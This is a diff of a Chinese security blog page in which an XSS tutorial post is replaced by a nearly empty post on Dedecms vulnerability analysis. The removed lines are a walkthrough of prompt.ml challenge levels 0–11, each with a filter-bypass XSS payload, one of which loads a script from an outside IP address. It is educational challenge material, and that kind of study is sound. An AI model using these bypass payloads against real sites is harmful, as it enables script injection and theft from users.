@@ -7,22 +7,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>xss入门 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
+  <title>Dedecms漏洞分析-2 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="9.2-9.4一直在忙专业短学期的软件个人实训，代码其实写了一天半就差不多了，主要是写文档，用学长的话说就是文档工程顺便学了软件😂 其中有个学弟想学xss，正好我xss也很菜，就刷个oj记录一下">
-<meta name="keywords" content="xss">
+  <meta name="description" content="继续复现Ddecms的漏洞">
+<meta name="keywords" content="cms,代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss入门">
-<meta property="og:url" content="https://glotozz.github.io/2019/09/06/xss入门/index.html">
+<meta property="og:title" content="Dedecms漏洞分析-2">
+<meta property="og:url" content="https://glotozz.github.io/2019/09/24/Dedecms漏洞分析-2/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:description" content="9.2-9.4一直在忙专业短学期的软件个人实训，代码其实写了一天半就差不多了，主要是写文档，用学长的话说就是文档工程顺便学了软件😂 其中有个学弟想学xss，正好我xss也很菜，就刷个oj记录一下">
+<meta property="og:description" content="继续复现Ddecms的漏洞">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-08T10:30:05.196Z">
+<meta property="og:updated_time" content="2019-09-23T23:28:11.601Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xss入门">
-<meta name="twitter:description" content="9.2-9.4一直在忙专业短学期的软件个人实训，代码其实写了一天半就差不多了，主要是写文档，用学长的话说就是文档工程顺便学了软件😂 其中有个学弟想学xss，正好我xss也很菜，就刷个oj记录一下">
+<meta name="twitter:title" content="Dedecms漏洞分析-2">
+<meta name="twitter:description" content="继续复现Ddecms的漏洞">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -150,20 +150,20 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-xss入门" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-Dedecms漏洞分析-2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      xss入门
+      Dedecms漏洞分析-2
     </h1>
   
 
         
-        <a href="/2019/09/06/xss入门/" class="archive-article-date">
-  	<time datetime="2019-09-05T23:58:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-06</time>
+        <a href="/2019/09/24/Dedecms漏洞分析-2/" class="archive-article-date">
+  	<time datetime="2019-09-23T23:24:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
 </a>
         
       </header>
@@ -171,156 +171,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <meta name="referrer" content="no-referrer">
-
-
-<blockquote>
-<p>9.2-9.4一直在忙专业短学期的软件个人实训，代码其实写了一天半就差不多了，主要是写文档，用学长的话说就是文档工程顺便学了软件😂</p>
-<p>其中有个学弟想学xss，正好我xss也很菜，就刷个oj记录一下</p>
+        <blockquote>
+<p>继续复现Ddecms的漏洞</p>
 </blockquote>
 <a id="more"></a>
 
-<h2 id="0、"><a href="#0、" class="headerlink" title="0、"></a>0、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // warm up</span><br><span class="line">    // script should be executed without user interaction</span><br><span class="line">    return &apos;&lt;input type=&quot;text&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<meta name="referrer" content="no-referrer">
 
-<p>两种方法，思路类似，就是先闭合，再重新构造个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;//</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;svg/onload=prompt(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>第一个很好理解，第二个用法在这有点大材小用之感，svg的用法很多，举个列子</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>没错，第一个能执行，第二个不能执行，</p>
-<p>SVG 意为可缩放矢量图形（Scalable Vector Graphics）。</p>
-<p>SVG 使用 XML 格式定义图像。</p>
-<p>原理在是&lt;svg&gt;遵循XML和SVG的定义，而再XML中实体会自动转义，比如 &amp;#40; 会转义成 (，除了&lt;![CDATA[ 和]]&gt;包含的实体</p>
-<p>应该可以想到可以利用实体编码绕过一个正则表达式😁</p>
-</blockquote>
-<h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // tags stripping mechanism from ExtJS library</span><br><span class="line">    // Ext.util.Format.stripTags</span><br><span class="line">    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</span><br><span class="line">    input = input.replace(stripTagsRE, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>绕过这个正则</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\/?[^&gt;]+&gt;/gi</span><br></pre></td></tr></table></figure>
-
-<p>g表少全局（即找到一次替换一次），i表少不区分大小写</p>
-<p>&lt;    /(0次到1次)    任意字符（一次或多次）&gt;</p>
-<p>可以通过少输入一个&gt;来绕过正则,但仍然可以执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(1)&quot;</span><br><span class="line"></span><br><span class="line">&lt;img src=# onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这里又是两种用法，第二种好理解插入图片，错误则弹窗，第一种比较有意思</p>
-<p>body是document的根元素，不能被<code>div</code>替换。浏览器渲染时是看到body标签才开始在body里去渲染剩余的内容，如果使用div代替了body，那么渲染程序找不到body标签，就永远不会渲染网页主体内容。</p>
-</blockquote>
-<h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // v-- frowny face</span><br><span class="line">    input = input.replace(/[=(]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // ok seriously, disallows equal signs and open parenthesis</span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正则表达式过滤了=(</p>
-<p>正好我们前面用过的svg可以派上用场，直接拿来用，以及最后面两种支持es6的情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;eval.call`$&#123;&apos;prompt\x281)&apos;&#125;`&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;prompt.call`$&#123;1&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential comment end delimiters</span><br><span class="line">    input = input.replace(/-&gt;/g, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    // comment the input to avoid script execution</span><br><span class="line">    return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输出在&lt;!–注释符–&gt;里面，想办法闭合，但是过滤了-&gt;</p>
-<p>但是除了–&gt;闭合外，还可以用–!&gt;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">--!&gt;&lt;body onload=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="4、"><a href="#4、" class="headerlink" title="4、"></a>4、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // make sure the script belongs to own site</span><br><span class="line">    // sample script: http://prompt.ml/js/test.js</span><br><span class="line">    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123;</span><br><span class="line">        var script = document.createElement(&apos;script&apos;);</span><br><span class="line">        script.src = input;</span><br><span class="line">        return script.outerHTML;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &apos;Invalid resource.&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>test()方法搜索字符串指定的值，根据结果并返回真或假。</p>
-<p>利用<code>decodeURIComponent()</code>这个函数可对<code>encodeURIComponent()</code>函数编码的URI进行解码的特性，将 %2f 解码成为 /。</p>
-<p>URL详解:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://login:password@address:port/path/to/resource?query_string#fragment</span><br></pre></td></tr></table></figure>
-
-<p>利用@前的会作为身份凭证，去访问@后的地址。让 browser 把<code>prompt.ml%2f</code>当作身份验证，然后访问<code>localhost/xss.js</code></p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//prompt.ml%2f@localhost/xss.js</span><br></pre></td></tr></table></figure>
-
-<h2 id="5、"><a href="#5、" class="headerlink" title="5、"></a>5、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // apply strict filter rules of level 0</span><br><span class="line">    // filter &quot;&gt;&quot; and event handlers</span><br><span class="line">    input = input.replace(/&gt;|on.+?=|focus/gi, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;&lt;input value=&quot;&apos; + input + &apos;&quot; type=&quot;text&quot;&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过滤了&gt;，on***=，focus</p>
-<p>并且是全局和不区分大小写</p>
-<p>首先是过滤，把onxxxx=这样的替换为_,这里用一个回车绕过。</p>
-<p>其次是第二点，就是后面的type不可以覆盖前面的，所以可以把type=image。</p>
-<p>过滤了&gt;，on事件和focus事件</p>
-<p>在 html 中，属性描述不在同一行仍然可以生效。将 type 覆盖为 image ，用 onerror 事件（multi-line）触发XSS</p>
-<p>构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;type=image src onerror</span><br><span class="line">=&quot;alert(1)</span><br></pre></td></tr></table></figure>
-
-<h2 id="6、"><a href="#6、" class="headerlink" title="6、"></a>6、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // let&apos;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        // pass in formURL#formDataJSON</span><br><span class="line">        // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments = input.split(&apos;#&apos;);</span><br><span class="line">        var formURL = segments[0];</span><br><span class="line">        var formData = JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form = document.createElement(&apos;form&apos;);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = &apos;post&apos;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input = form.appendChild(document.createElement(&apos;input&apos;));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(&apos;value&apos;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &apos;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;/script&gt;                                                 \n\</span><br><span class="line">        &apos;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &apos;Invalid form data.&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这题应该算是利用变量覆盖</p>
-<p>将用户输入先按照#划分数组，表单的action属性是url，但是这里用正则匹配过滤了javascript:</p>
-<p>​    vbscript:    data:，但是发现检查的对象是document.forms[0].action，这里就可以利用变量覆盖，直接构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)#&#123;&quot;action&quot;:&quot;xss&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样判断的时候就绕过正则了</p>
-<h2 id="7、"><a href="#7、" class="headerlink" title="7、"></a>7、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // pass in something like dog#cat#bird#mouse...</span><br><span class="line">    var segments = input.split(&apos;#&apos;);</span><br><span class="line">    return segments.map(function(title) &#123;</span><br><span class="line">        // title can only contain 12 characters</span><br><span class="line">        return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 12) + &apos;&quot;&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;).join(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>map() 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。</p>
-<p>slice() 提取字符串片段</p>
-<p>以#分割参数，然后每个都写到一个p标签里，每个参数只取前12位，可以用注释符</p>
-<blockquote>
-<p>javascript注释符</p>
-<p>单行//</p>
-<p>多行/**/</p>
-<p>而  </p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;是html注释，&lt;!-- --&gt; 在Javascript内使用此注释符主要目的：为了查看浏览器是否支持JavaScript脚本语言，如果不支持跳过此部分；如果支持就执行此部分。</span><br></pre></td></tr></table></figure>
-
-<p>所以直接构造#分割的数组即可，保证每组不超过12位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/a=#&quot;οnlοad=&apos;/*#*/prompt(1)&apos;</span><br><span class="line">详细例子</span><br><span class="line">&quot;&gt;&lt;script&gt;/*#*/alert(/*#*/1)/*#*/&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/alert(/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/1)/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="8、"><a href="#8、" class="headerlink" title="8、"></a>8、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // prevent input from getting out of comment</span><br><span class="line">    // strip off line-breaks and stuff</span><br><span class="line">    input = input.replace(/[\r\n&lt;/&quot;]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;                                \n\</span><br><span class="line">&lt;script&gt;                                    \n\</span><br><span class="line">    // console.log(&quot;&apos; + input + &apos;&quot;);        \n\</span><br><span class="line">&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要利用换行来绕过这个注释符，但是这里又有正则表达式限制\r和\n和&lt;和/和”</p>
-<p>wp说是用行分隔符，</p>
-<p>如下paylaod，unicode编码绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[U+2028]prompt(1)[U+2028]</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>但是这里没有复现成功😥</p>
-</blockquote>
-<h2 id="9、"><a href="#9、" class="headerlink" title="9、"></a>9、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential start-tags</span><br><span class="line">    input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;);</span><br><span class="line">    // use all-caps for heading</span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span><br><span class="line">    return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>$1表示引用前面匹配到的第一组字符串;</p>
-<p>就是比如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">=&gt;</span><br><span class="line">&lt;_script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>再转化为大写</p>
-<p>这里的关键在于<strong>toUpperCase()</strong>不仅转换英文字母，也转换一些<strong>Unicode</strong>字符，比如将<code>ſ</code>传入就可以转换为<code>S</code>，这样就可以绕过正则。直接上&lt;ſcript&gt;prompt(1)&lt;/ſcript&gt;发现不行  查了一下发现js是对大小写敏感的</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript/ſrc=&quot;http://59.110.164.44/1.js&quot;&gt;&lt;/ſcript&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如果script标签使用来引用外部js文件的，那么这个script标签中就不能写任何js代码</p>
-<p>//js文件中不需要加script标签</p>
-<p>alert(1);</p>
-</blockquote>
-<h2 id="10、"><a href="#10、" class="headerlink" title="10、"></a>10、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // (╯°□°）╯︵ ┻━┻</span><br><span class="line">    input = encodeURIComponent(input).replace(/prompt/g, &apos;alert&apos;);</span><br><span class="line">    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span><br><span class="line">    input = input.replace(/&apos;/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span><br><span class="line">    return &apos;&lt;script&gt;&apos; + input + &apos;&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>encodeURIComponent()不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ‘ ( ) 。其他字符（比如 ：;/?:@&amp;=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。</p>
-</blockquote>
-<p>这里会把提示替换为警报，然后把’替换为空，但是因为替换顺序问题，php代码审计中也会出现这种类型的题</p>
-<p>构造paylaod</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p&apos;rompt(1)</span><br></pre></td></tr></table></figure>
-
-<h2 id="11、"><a href="#11、" class="headerlink" title="11、"></a>11、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // name should not contain special characters</span><br><span class="line">    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // data to be parsed as JSON</span><br><span class="line">    var dataString = &apos;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &apos; + memberName + &apos;.&quot;&#125;&apos;;</span><br><span class="line"></span><br><span class="line">    // directly &quot;parse&quot; data in script context</span><br><span class="line">    return &apos;                                \n\</span><br><span class="line">&lt;script&gt;                                    \n\</span><br><span class="line">    var data = &apos; + dataString + &apos;;          \n\</span><br><span class="line">    if (data.action === &quot;login&quot;)            \n\</span><br><span class="line">        document.write(data.message)        \n\</span><br><span class="line">&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这道题过滤了几乎所有的符号，只有（）可以用，这里要用个黑科技，让字母有操作符的功能，就是in.</p>
-<p>构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;                                    </span><br><span class="line">    var data = &#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &quot;(prompt(1))in&quot;.&quot;&#125;;     </span><br><span class="line">    if (data.action === &quot;login&quot;)            </span><br><span class="line">        document.write(data.message)        </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里的原因是因为”test”(alert(1))虽然会提示语法错误， 但是还是会执行js语句。类似的alert(1)in”test”也是一样。可以在控制台下使用F12执行</p>
-<blockquote>
-<p>tnl，越做到后面对javascript的掌握要求越高😱，先到这，后面几题过两天在做。。。咕咕咕</p>
-</blockquote>
-<p>记录几种xss触发方法，或者说是运行js的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img scr=1 onerror=alert(&apos;xss&apos;)&gt;当找不到图片名为1的文件时，执行alert(&apos;xss&apos;)</span><br><span class="line">&lt;a href=javascrip:alert(&apos;xss&apos;)&gt;s&lt;/a&gt; 点击s时运行alert(&apos;xss&apos;)</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe的scr来弹窗</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;过滤了alert来执行弹窗</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考地址："><a href="#参考地址：" class="headerlink" title="参考地址："></a>参考地址：</h3><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p>
-<p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
-<p><a href="https://blog.csdn.net/Ni9htMar3/article/details/77938899" target="_blank" rel="noopener">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></p>
-<p><a href="https://www.cnblogs.com/Ashenone/p/9049341.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ashenone/p/9049341.html</a></p>
 
       
 
@@ -361,7 +218,7 @@
           </li>
           <li class="post-copyright-link">
           <strong>文章链接:  </strong>
-          <a href="/2019/09/06/xss入门/" target="_blank" title="xss入门">https://glotozz.github.io/2019/09/06/xss入门/</a>
+          <a href="/2019/09/24/Dedecms漏洞分析-2/" target="_blank" title="Dedecms漏洞分析-2">https://glotozz.github.io/2019/09/24/Dedecms漏洞分析-2/</a>
           </li>
           <li class="post-copyright-license">
             <strong>版权声明:   </strong>
@@ -381,7 +238,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cms</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
         		</li>
       		
 		</ul>
@@ -437,7 +298,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/06/xss入门/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/24/Dedecms漏洞分析-2/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -451,18 +312,9 @@
   
